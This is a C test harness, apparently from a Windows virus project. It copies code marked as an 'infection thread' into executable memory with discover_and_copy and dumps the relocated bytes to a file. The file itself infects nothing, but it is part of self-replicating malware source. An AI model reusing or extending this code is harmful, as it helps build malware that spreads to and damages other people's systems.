#undef NDEBUG
#include <assert.h>
#include <stdio.h>
#include <windows.h>

#include "code_begin.h"
#include "code_end.h"
#include "block/copy.h"
#include "infection_thread.h"
#include "utility.h"

void *alloc_executable(size_t size) {
    return VirtualAlloc(NULL, (SIZE_T)size, MEM_COMMIT | MEM_RESERVE,
                        PAGE_EXECUTE_READWRITE);
}

void free_mem(void *mem) {
    if (mem != NULL) {
        VirtualFree(mem, 0, MEM_RELEASE);
    }
}

void memdump(void *addr, size_t size, const char *filename) {
    FILE *f = fopen(filename, "w");
    if (f != NULL) {
        fwrite(addr, 1, size, f);
        fclose(f);
    }
}

int main(int argc, char **argv) {
    void *entrypoints[] = {(void *)spawn_infection_thread,
                           (void *)infection_thread, NULL};

    size_t target_size = BYTE_DIFF(code_end, code_begin) * 2;
    assert(target_size > 0);
    PRINT_DEBUG("Random target code size guess = %.1fkB",
                (float)target_size / 1024.);

    PRINT_DEBUG("Allocating target memory");
    void *target_mem = alloc_executable(target_size);
    assert(target_mem != NULL);

    void *dest_entrypoint = discover_and_copy(entrypoints, code_begin, code_end,
                                              target_mem, target_size);
    assert(dest_entrypoint != NULL);
    PRINT_DEBUG("Target entry poin is %p", dest_entrypoint);

    memdump(target_mem, target_size, "copied_code.bin");
    free_mem(target_mem);

    PRINT_DEBUG("Finished");
    fgetc(stdin);

    return 0;
}
